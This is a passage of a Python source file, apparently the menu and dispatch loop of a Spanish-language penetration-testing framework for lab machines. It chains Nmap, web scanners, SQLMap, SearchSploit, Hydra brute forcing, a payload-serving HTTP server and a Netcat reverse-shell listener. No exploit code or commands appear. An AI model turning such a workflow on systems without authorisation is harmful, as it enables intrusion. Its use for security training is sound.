        print(f"{Fore.GREEN}╚{'═' * (W-2)}╝{Style.RESET_ALL}")

        # -- Fase 1: Reconocimiento
        _section("FASE 1 -- RECONOCIMIENTO & ESCANEO", color=Fore.CYAN)
        _opt(1,  "Fingerprint de SO (Ping TTL)")

        nmap_status = _badge("[OK] COMPLETADO", Fore.GREEN) if nmap_executed else _badge("<-- EMPIEZA AQUI", Fore.YELLOW)
        _opt(2,  "Escaneo de Puertos y Servicios (Nmap)", status=nmap_status)
        _opt(3,  "Entornos Windows (Enum4Linux)")

        # -- Fase 2: Web
        _section("FASE 2 -- ENUMERACION WEB", color=Fore.CYAN)
        if not nmap_executed:
            _warn("Ejecuta Nmap (2) primero para calibrar protocolo y dominio.")
        elif not has_web_flags:
            _warn("Nmap no detecto HTTP/HTTPS. Las herramientas web podrian fallar.")
        _opt(4,  "Enumeracion de Directorios Web (Gobuster)")
        ffuf_status = _badge("DOMINIO ACTIVO", Fore.GREEN) if active_domain else _badge("Requiere Dominio", Fore.RED)
        _opt(5,  "Descubrimiento de Subdominios (FFuF)", status=ffuf_status)
        _opt(6,  "Scanner CMS WordPress (WPScan)")
        _opt(7,  "Inyecciones SQL Dinamicas (SQLMap)")
        _opt(8,  "Scanner CVEs Modernos (Nuclei)")
        _opt(9,  "Vulnerabilidades Web Clasicas (Nikto)")

        # -- Fase 3: Explotacion
        _section("FASE 3 -- EXPLOTACION & POST-EXPLOTACION", color=Fore.RED)
        _opt(10, "Busqueda de Exploits Publicos (SearchSploit)")
        _opt(11, "Fuerza Bruta de Autenticacion (Hydra FTP/SSH)")
        _opt(12, "Servidor HTTP de Transferencia de Payloads")
        _opt(13, "Abrir Puerto de Escucha Netcat (Reverse Shell)")

        # -- Reporting
        _section("REPORTING & SALIDA", color=Fore.MAGENTA)
        _opt(14, "Compilar y Abrir Reporte HTML Maestro")
        _opt(15, "Volver al Menu Principal")

        print()
        _line("─")
        opcion = _prompt("Selección")

        if opcion == '1':
            detect_os(ip, workspace_dir)
        elif opcion == '2':
            nmap_state = run_nmap(ip, workspace_dir)
            nmap_executed = True
            has_web_flags = nmap_state.get('has_web', False)
            active_protocol = nmap_state.get('web_protocol', 'http://')
            found_domains = nmap_state.get('domains', [])
            if found_domains:
                active_domain = found_domains[0]
                active_target = active_domain
                _ok(f"Dominio detectado y guardado: {active_domain}  →  VHOST Activado.")
                
        elif opcion == '3':
             run_enum4linux(ip, workspace_dir)
        elif opcion == '4':
            if not nmap_executed: _err("Ejecuta Nmap (opción 2) primero.")
            else: run_web_enum(active_target, active_protocol, workspace_dir)
        elif opcion == '5':
            run_ffuf_subdomains(active_target, active_protocol, active_domain, workspace_dir)
        elif opcion == '6':
            if not nmap_executed: _err("Ejecuta Nmap (opción 2) primero.")
            else: run_wpscan(active_target, active_protocol, workspace_dir)
        elif opcion == '7':
             run_sqlmap(workspace_dir)
        elif opcion == '8':
            if not nmap_executed: _err("Ejecuta Nmap (opcion 2) primero.")
            else: run_nuclei(active_target, active_protocol, workspace_dir)
        elif opcion == '9':
            if not nmap_executed: _err("Ejecuta Nmap (opcion 2) primero.")
            else: run_nikto(active_target, active_protocol, workspace_dir)
        elif opcion == '10':
            run_searchsploit(workspace_dir)
        elif opcion == '11':
             run_hydra_bruteforce(ip, workspace_dir)
        elif opcion == '12':
             start_http_server_payloads(workspace_dir)
        elif opcion == '13':
             run_netcat_listener(workspace_dir)
        elif opcion == '14':
            generate_html_report(ip, active_domain, workspace_dir)
        elif opcion == '15':
            break
        else:
            _err("Opcion no reconocida. Introduce el numero correspondiente.")

        # Pausa para asimilar la salida antes de redibujar el menu
        input(f"\n  {Fore.CYAN}[Pulsa ENTER para continuar...]{Style.RESET_ALL}")


def main():
    """Función principal que arranca el framework y gestiona el menú."""
    init(autoreset=True)
    try:
        print_banner()
        check_dependencies()
        
        while True:
            _box_title("MENU PRINCIPAL", Fore.BLUE)

            _section("Reconocimiento", color=Fore.CYAN)
            _opt(1, "Escanear Red Local (ARP Scan)")

            _section("Objetivo", color=Fore.CYAN)
            _opt(2, "Configurar Host Objetivo Manualmente")

            _section("Sistema", color=Fore.CYAN)
            _opt(3, "Salir del Framework")

            print()
            _line("-")
            opcion = _prompt("Seleccion")

            if opcion == '1':
                do_arp_scan()
            elif opcion == '2':
                _line("-", Fore.CYAN)
                ip = _prompt("Introduce la IP objetivo  (ej. 192.168.1.50)")
                if ip:
                    if not validate_target(ip):
                        _err(f"'{ip}' no es una IP ni hostname valido. Ejemplo: 192.168.1.5 o maquina.htb")
                    else:
                        target_menu(ip)
                else:
                    _err("La IP no puede estar vacia.")
            elif opcion == '3':
                print()
                _ok("¡Hasta pronto! Gracias por usar el Framework.")
                print()
                sys.exit(0)
            else:
                _err("Opción no reconocida. Por favor introduce un número del menú.")
            
            time.sleep(1.2)
                
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupción por teclado (Ctrl+C) detectada. Cerrando framework...{Style.RESET_ALL}")
        sys.exit(0)


if __name__ == "__main__":
    main()
